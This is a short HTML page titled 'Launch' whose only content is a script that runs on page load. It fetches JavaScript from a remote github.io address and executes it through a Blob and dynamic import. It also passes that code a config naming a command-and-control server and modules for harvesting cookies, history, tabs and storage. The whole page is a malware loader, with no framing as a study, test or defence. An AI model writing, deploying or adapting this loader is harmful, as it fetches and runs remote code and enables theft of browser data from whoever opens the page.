<!DOCTYPE html>
<html>
<head><title>Launch</title></head>
<body>
<script>
  const cfg = {
    active: true,
    c2: "http://192.168.1.185:5000",
    modules: ["cookies", "history", "tabs", "storage"]
  };
  const agentURL = "https://tenebrustan.github.io/11-test/background.js";

  fetch(agentURL)
    .then(r => r.text())
    .then(code => {
      const full = code +
        "\nwindow.run?.(" + JSON.stringify(cfg) + ");";
      const blob = new Blob([full], { type: "text/javascript" });
      const url = URL.createObjectURL(blob);
      import(url);
    })
    .catch(err => console.error("launch fetch failed:", err));
</script>
</body>
</html>
